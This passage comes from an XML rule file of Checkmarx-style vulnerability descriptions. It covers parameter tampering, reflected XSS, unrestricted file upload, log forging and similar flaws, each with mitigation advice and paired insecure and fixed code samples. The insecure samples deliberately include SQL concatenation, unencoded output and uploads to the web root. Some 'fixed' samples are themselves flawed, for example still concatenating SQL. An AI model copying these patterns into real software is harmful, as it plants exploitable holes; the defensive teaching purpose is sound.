&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&amp;#160;&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Enforce authorization checks before providing any access to sensitive data, including the specific object reference.&amp;#160;&lt;/li&gt;
&lt;li&gt;Explicitly block access to any unauthorized data, especially to other users&amp;#8217; data.&lt;/li&gt;
&lt;li&gt;If possible, avoid allowing the user to request arbitrary data by simply sending a record ID. For example, instead of having the user send an account ID, the application should look up the account ID for the current authenticated user session.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Mitigation:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not concatenate user input directly into SQL queries.&amp;#160;&lt;/li&gt;
&lt;li&gt;Include a user-specific identifier as a filter in the WHERE clause of the SQL query.&amp;#160;&lt;/li&gt;
&lt;li&gt;Map the user input to an indirect reference, e.g. via a prepared list of allowable values.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unfiltered Direct Object Reference&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountInfo(request req)  {
    int accountId = Integer.parseInt(req.getParameter("accountId"));
    
    string sql = "select * from [Accounts] where [AccountId] = " 
                        + accountId.toString();
                        
    Statement stmt = conn.createStatement();
    ResultSet accountRS = stmt.executeQuery(sql); 
    
    return accountRS;
}&lt;/pre&gt;&lt;h4&gt;Record References are Now Filtered and Indirect&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountInfo(request req)  {
    int accountIndex = Integer.parseInt(req.getParameter("accountIndex"));
    int realAccountId = userAccountList.get(accountIndex);
    
    int userId = req.getSession().getAttribute("userId"); 
    
    string sql = "select * from [Accounts] where [AccountId] = " 
                        + realAccountId.toString() 
                        + " and [UserId] = " + userId.toString();
                        
    Statement stmt = conn.createStatement();
    ResultSet accountRS = stmt.executeQuery(sql); 
    
    return accountRS;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1219</key><name>Potential_Parameter_Tampering</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;A malicious user could access other users&amp;#8217; information. By requesting information directly, such as by an account number, authorization may be bypassed and the attacker could steal confidential or restricted information (for example, a bank account balance), using a direct object reference.&amp;#160;&lt;/div&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;The application provides user information without filtering by user ID. For example, it may provide information solely by a submitted account ID. The application concatenates the user input directly into the SQL query string, without any additional filtering. The application also does not perform any validation on the input, nor constrain it to a pre-computed list of acceptable values.&amp;#160;&lt;/div&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&amp;#160;&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Enforce authorization checks before providing any access to sensitive data, including the specific object reference.&amp;#160;&lt;/li&gt;
&lt;li&gt;Explicitly block access to any unauthorized data, especially to other users&amp;#8217; data.&lt;/li&gt;
&lt;li&gt;If possible, avoid allowing the user to request arbitrary data by simply sending a record ID. For example, instead of having the user send an account ID, the application should look up the account ID for the current authenticated user session.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Mitigation:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not concatenate user input directly into SQL queries.&amp;#160;&lt;/li&gt;
&lt;li&gt;Include a user-specific identifier as a filter in the WHERE clause of the SQL query.&amp;#160;&lt;/li&gt;
&lt;li&gt;Map the user input to an indirect reference, e.g. via a prepared list of allowable values.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unfiltered Direct Object Reference&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountInfo(request req)  {
    int accountId = Integer.parseInt(req.getParameter("accountId"));
    
    string sql = "select * from [Accounts] where [AccountId] = " 
                        + accountId.toString();
                        
    Statement stmt = conn.createStatement();
    ResultSet accountRS = stmt.executeQuery(sql); 
    
    return accountRS;
}&lt;/pre&gt;&lt;h4&gt;Record References are Now Filtered and Indirect&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountInfo(request req)  {
    int accountIndex = Integer.parseInt(req.getParameter("accountIndex"));
    int realAccountId = userAccountList.get(accountIndex);
    
    int userId = req.getSession().getAttribute("userId"); 
    
    string sql = "select * from [Accounts] where [AccountId] = " 
                        + realAccountId.toString() 
                        + " and [UserId] = " + userId.toString();
                        
    Statement stmt = conn.createStatement();
    ResultSet accountRS = stmt.executeQuery(sql); 
    
    return accountRS;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_628</key><name>DB_Parameter_Tampering</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;A malicious user could access other users&amp;#8217; personal information, by simply altering the reference parameter sent to the server. Thus, the malicious user could bypass access controls and access unauthorized records, such as other users accounts,&amp;#160;stealing confidential or restricted information.&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;The application accesses&amp;#160;user information without filtering by user ID. For example, it may provide information solely by a submitted account ID. The application uses the user input to filter specific records from database tables, which contain sensitive personal information (e.g. user accounts or payment details). Since the application does not filter the records according to any user identifier, nor&amp;#160;constrain it to a pre-computed list of acceptable values, a malicious user can easily modify the submitted reference identifier, and thus access unauthorized records.&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&amp;#160;&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Enforce authorization checks before providing any access to sensitive data, including the specific object reference.&amp;#160;&lt;/li&gt;
&lt;li&gt;Explicitly block access to any unauthorized data, especially to other users&amp;#8217; data.&lt;/li&gt;
&lt;li&gt;If possible, avoid allowing the user to request arbitrary data by simply sending a record ID. For example, instead of having the user send an account ID, the application should look up the account ID for the current authenticated user session.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Mitigation:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Filter the database query according to&amp;#160;a user-specific identifier, such as the customer number.&amp;#160;&lt;/li&gt;
&lt;li&gt;Map the user input to an indirect reference, e.g. via a prepared list of allowable values.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unfiltered Direct Object Reference&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountInfo(request req){
    int accountId = Integer.parseInt(req.getParameter("accountId"));    
    PreparedStatement stmt = connection.PreparedStatement("SELECT * from Accounts where AccountId = ?");
    
    stmt.setInt(1, accountId);   
    ResultSet accountRS = stmt.executeQuery();                 
    
    return accountRS;
}&lt;/pre&gt;&lt;h4&gt;Record References are Now Filtered and Indirect&lt;/h4&gt;&lt;pre&gt;    public ResultSet getAccountInfo(request req){
    int accountIndex = Integer.parseInt(req.getParameter("accountId"));
    int realAccountId = userAccountList.get(accountIndex);
    int userId = req.getSession().getAttribute("userId"); 
    PreparedStatement stmt = connection.PreparedStatement("SELECT * from Accounts where AccountId = ? AND UserId = ?");
    
    stmt.setInt(1, realAccountId);   
    stmt.setInt(2, userId);
    ResultSet accountRS = stmt.executeQuery();                 
    
    return accountRS;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_591</key><name>Reflected_XSS_All_Clients</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to cause a user to send the website engineered input, rewriting web pages and inserting malicious scripts. The attacker can then pretend to be the original website, which would enable the attacker to steal the user's password, request the user&amp;#8217;s credit card information, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website, and the victim would blame the site for incurred damage.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from previous user input. The user input is embedded directly in the page's HTML, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary user input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in output.&lt;/li&gt;
&lt;li&gt;Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;JavaScript encoding for server-generated JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or the built-in platform functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Bad - The application uses the "Referer" field string to construct the HttpResponse&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClients
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(Referer);
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "Referer" field string is HTML encoded before use&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClientsFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response, AntiXss.AntiXssEncoder encoder)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(encoder.HtmlEncode(Referer, true));
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - User input is written to a TextBox displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClients
{
        public void foo(TextBox tb)
        {
                string input = Console.ReadLine();
                tb.Text = input;
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The user input is HTML encoded before being displayed on the screen&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClientsFixed
{
        public void foo(TextBox tb, AntiXssEncoder encode)
        {
                string input = Console.ReadLine();
                tb.Text = encode.HtmlEncode(input);
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - The application uses the "filename" field string from an HttpRequest construct an HttpResponse&lt;/h4&gt;&lt;pre&gt;public class UTF7XSS
{
        public void foo(HttpRequest Request, HttpResponse Response
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["filename"];
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "filename" string is converted to an int and using a switch case the new "filename" string is constructed&lt;/h4&gt;&lt;pre&gt;public class UTF7XSSFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["fileNum"];
                int fileNum = Convert.ToInt32(filename);
                
                switch(fileNum)
                {
                        case 1:
                                filename = "File1.txt";
                                break;
                        default:
                                filename = "File2.txt";
                                break;
                }
                
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User input is written to a label displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClients {
	public static void XSSExample(TextArea name) {	
		Label label = new Label();		
		label.setText("Hello " + name.getText());	
	}
}&lt;/pre&gt;&lt;h4&gt;Switch case is used in order to assemble the label's text value and manage wrong user input&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClientsFixed {
	public static void XSSExample(TextArea name) {
		Label label = new Label();		
		switch (name) {
		case "Joan":
			label.setText("Hello Joan");	
			break;
		case "Jim":
			label.setText("Hello Jim");	
			break;
		case "James":
			label.setText("Hello James");	
			break;
		default:
			System.out.println("Wrong Input");
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3894</key><name>Unrestricted_File_Upload</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;An attacker that exploits this vulnerability would be able to cause the application server to execute arbitrary code, allowing the attacker to alter&amp;nbsp;the application, run any&amp;nbsp;operating system command, and even take over the server altogether, depending on the application's system privileges.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The application allows users to upload a file to the application, which is saved to a file within the web site's directory. The application does not apply thorough validation checks on the uploaded file, especially with regards to the file type or contents. This enables the attacker to upload executable files, in particular web server code such as .ASP, .PHP, and .JSP files, and others.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;When this is followed by a regular request to the web application for the previously uploaded files, the application server will then proceed to execute the code in the uploaded file, giving the attacker direct access to the command execution environment.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Generic Guidance:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style="text-decoration: underline;"&gt;&lt;strong&gt;Storage:&lt;/strong&gt;&lt;/span&gt; If possible, avoid saving uploaded files to disk on the server, instead storing them in an external data storage, e.g. database or document management system.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;&lt;span style="text-decoration: underline;"&gt;&lt;strong&gt;Location:&lt;/strong&gt;&lt;/span&gt; User files should be stored in an isolated directory, outside of the web site's directory with direct browsing disabled. When required, the application should explicitly read the file in code, and stream the contents to the user applicatively. &amp;nbsp;&lt;/li&gt;
&lt;li&gt;&lt;span style="text-decoration: underline;"&gt;&lt;strong&gt;Non-execution:&lt;/strong&gt;&lt;/span&gt; Files uploaded from users should be explicitly marked as non-executable by the web / application server, e.g. in configuration file or by&amp;nbsp;directory.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;&lt;span style="text-decoration: underline;"&gt;&lt;strong&gt;Validation:&lt;/strong&gt;&lt;/span&gt;&amp;nbsp;Always validate all user input. In particular, enforce a whitelist of allowed file-types, according to the file extenstion and/or MIME type. Do not allow arbitrary files (such as .ASP, .PHP, .JSP, .EXE, .HTML, and so on). For example, accept only images such as&amp;nbsp;.GIF, .JPG, .PNG, .BMP, and so on.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;&lt;span style="text-decoration: underline;"&gt;&lt;strong&gt;Renaming:&lt;/strong&gt;&lt;/span&gt;&amp;nbsp;Explicilty impose a pre-defined extension according to the file type, before saving the file to disk. This can be a hardcoded extension, or a configured list of allowed file types.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;&lt;span style="text-decoration: underline;"&gt;&lt;strong&gt;Privileges:&lt;/strong&gt;&lt;/span&gt;&amp;nbsp;As a measure of Defense-in-Depth, configure the application server to execute in a limited system account, with minimal OS privileges.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Specific Recommendations:&amp;nbsp;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style="text-decoration: underline;"&gt;&lt;strong&gt;Validation:&lt;/strong&gt;&lt;/span&gt;&amp;nbsp;Validate the uploaded filename before saving the file to disk, and verify the total file size does not exceed defined limits.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Uploading Files to Web Directory&lt;/h4&gt;&lt;pre&gt;protected void doPost(HttpServletRequest request, HttpServletResponse response) 
  							throws ServletException, IOException {
	String userDir = getServletContext().getRealPath("/userFiles/");

	String contentType = request.getContentType();
	if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {
		String boundary = contentType.substring(contentType.indexOf("boundary=") + 9);
		
		BufferedReader reader = new BufferedReader(new InputStreamReader(request.getInputStream()));
		String firstLine = reader.readLine(); 
		String filename = firstLine.substring(firstLine.lastIndexOf("\\"), firstLine.lastIndexOf("\""));

		BufferedWriter writer = new BufferedWriter(new FileWriter(userDir + filename, true));

		for (String line; (line=reader.readLine())!=null; ) {
			if (line.indexOf(boundary) == -1) {
				writer.write(line);
				writer.newLine();
				writer.flush();
			}
		}
		writer.close(); 
	}
}&lt;/pre&gt;&lt;h4&gt;Uploading Files Safely&lt;/h4&gt;&lt;pre&gt;protected void doPost(HttpServletRequest request, HttpServletResponse response) 
  							throws ServletException, IOException {
	String userDir = DATA_DIR_ROOT + "userFiles/";

	String contentType = request.getContentType();
	if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {
		String boundary = contentType.substring(contentType.indexOf("boundary=") + 9);
		
		BufferedReader reader = new BufferedReader(new InputStreamReader(request.getInputStream()));
		String firstLine = reader.readLine(); 
		String filename = firstLine.substring(firstLine.lastIndexOf("\\"), firstLine.lastIndexOf("\""));

&gt;		if (filename.toUpperCase().endsWith(".GIF")) { 
			try {
				BufferedWriter writer = new BufferedWriter(new FileWriter(userDir + filename, true));

				for (String line; (line=reader.readLine())!=null; ) {
					if (line.indexOf(boundary) == -1) {
						writer.write(line);
						writer.newLine();
						writer.flush();
					}
				}
				writer.close(); 
			} catch (IOException ex) {
				handleErrors(ex);
			}
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_622</key><name>Information_Exposure_Through_an_Error_Message</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Exposed details about the application&amp;#8217;s environment, users, or associated data (for example, stack trace) could enable an attacker to find another flaw and help the attacker to mount an attack.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application generates an error message including raw exceptions, either by not being handled, by explicit returning of the object, or by configuration. Exception details may include sensitive information that could leak out of the exception to the users.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ol&gt;
&lt;li&gt;Any method that could cause an exception should be wrapped in a try-catch block that:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Explicitly handles expected exceptions.&lt;/li&gt;
&lt;li&gt;Includes a default solution to explicitly handle unexpected exceptions.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Configure a global handler to prevent unhandled errors from leaving the application.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Do not reveal exception details, instead always return a static message.

      &lt;/h4&gt;&lt;pre&gt;


try
{
// Database access or other potentially dangerous function
}
catch (SqlException ex)
{
LogException(ex);
Response.Write("Error occurred.");
}



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Do not reveal exception details, instead always return a static message.

      &lt;/h4&gt;&lt;pre&gt;


try
{
// Database access or other potentially dangerous function
}
catch (SqlException ex)
{
LogException(ex);
Response.Write("Error occurred.");
}


      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4445</key><name>Stored_Log_Forging</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could inject fake events, or inject malicious content into the log files. This could be used to cover an attacker's malicious activities, falsely implicate an innocent user, corrupt the log file, and generally damage the integrity of the logging mechanism. The attacker could even cause an attack on the log viewer or log processing program.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application loads untrusted data, that may have earlier been tampered with by a malicious user. This data is then used, without sufficient validation or sanitization, to format and write a message to the logging mechanism. Assuming this is written to a simple text file, if an attacker injects CRLF characters into the data stored earlier, this would allow her to falsely create a new event in the log file. The attacker could have complete control on the additional, bogus log event that was seemingly created.&amp;#160;&amp;#65279;&amp;#65279;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Always validate all data, regardless of source.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not automatically process untrusted data without validation, even from the internal database or server files.&amp;#160;&lt;/li&gt;
&lt;li&gt;Use a secure logging mechanism.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Remove or encode all special characters relative to the format of the log files; this is typically the "&lt;code&gt;\n&lt;/code&gt;" and "&lt;code&gt;\r&lt;/code&gt;" (CRLF) characters.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Logging Untrusted Data&lt;/h4&gt;&lt;pre&gt;private int readUserId(ResultSet rs) { 
    String dbValue = rs.getString("UserId");
    int userId = 0; 
    
    try {
        userId = Integer.parseInt(dbValue); 
    } catch (NumberFormatException nfe) { 
        log.error("User Id: " + userId + " raised an error: " + nfe.getMessage());
    }
    
    return userId;
}&lt;/pre&gt;&lt;h4&gt;Logging only sanitized data&lt;/h4&gt;&lt;pre&gt;private int readUserId(ResultSet rs) { 
    String dbValue = rs.getString("UserId");
    int userId = 0; 
    
    try {
        userId = Integer.parseInt(dbValue); 
    } catch (NumberFormatException nfe) { 
        log.error("User Id: " + userId.replace('\r', '').replace('\n', '') + 
                    " raised an error: " + nfe.getMessage());
    }
    
    return userId;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4446</key><name>Portability_Flaw_Locale_Dependent_Comparison</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Performing string manipulations and comparisons without regard to the locale, can result in unexpected results. This can lead to bypass of input validation, format string attacks,&amp;#160;&lt;/div&gt;
&lt;div&gt;and possibly other string-based attacks such as Cross-Site Scripting (XSS), SQL Injection, and even Denial of Service (DoS).&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Many classes and methods perform locale-sensitive operations, including formatting numbers, dates, and strings according to the specific language and region.&amp;#160;Many&amp;#160;of these methods&amp;#160;&lt;/div&gt;
&lt;div&gt;allow the caller to ignore the locale or character set, and apply formatting and language rules based on the default locale settings for the current environment.&amp;#160;&lt;/div&gt;
&lt;div&gt;However, depending on the default settings, this could result in unexpected results. As an example, using the Turkish locale to transform a string to uppercase will turn a lowercase "i" into&amp;#160;"LATIN CAPITAL LETTER I WITH DOT ABOVE" (Unicode codepoint 0130). Clearly, this is not the expected result, and a comparison with a proper uppercase "I" would fail.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Always use locale-sensitive functions for comparing and manipulating specific strings, that are intended to have a particular value.&amp;#160;&lt;/li&gt;
&lt;li&gt;In Java, prefer to use the &lt;code&gt;Locale.ROOT&lt;/code&gt; locale as a neutral locale.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Locale Ignorant String Comparison&lt;/h4&gt;&lt;pre&gt;private bool validateInput(String input) {
    if (input.toUpperCase().indexOf("SCRIPT") &lt; 0)
        return true;    // Input string does not contain any form of SCRIPT
    else
        return false;
}&lt;/pre&gt;&lt;h4&gt;Locale-Neutral String Comparison&lt;/h4&gt;&lt;pre&gt;private bool validateInput(String input) {
    if (input.toUpperCase(Locale.ROOT).indexOf("SCRIPT") &lt; 0)
        return true;    // Input string does not contain any form of SCRIPT
    else
        return false;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_603</key><name>Hardcoded_Absolute_Path</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Generally, hardcoding absolute paths makes the application brittle, and will prevent the program from operating properly in some environments that do not have the identical file system structure. This will also cause software maintenance problems in future versions of the application, if the design or requirements were to change.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Additionally, if the application uses this path to read or write data, this can cause a breach of confidentiality or&amp;nbsp;allow malicious input into the program. In some situations, this vulnerability might even allow a malicious user to override the expected functionality, and cause the application to run any arbitrary program and execute any code the attacker deploys to the server.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Hardcoded paths are less flexible, and do not allow the application to account for changes in the environment. For example, the program might be installed in a different directory than the default. Likewise, different system languages and OS architectures can change the names of the system folders; for example, in a Spanish Windows machine there could&amp;nbsp;be&amp;nbsp;"&lt;code&gt;C:\Archivos de programa (x86)\&lt;/code&gt;" instead of "&lt;code&gt;C:\Program Files\&lt;/code&gt;".&amp;nbsp;&lt;/p&gt;
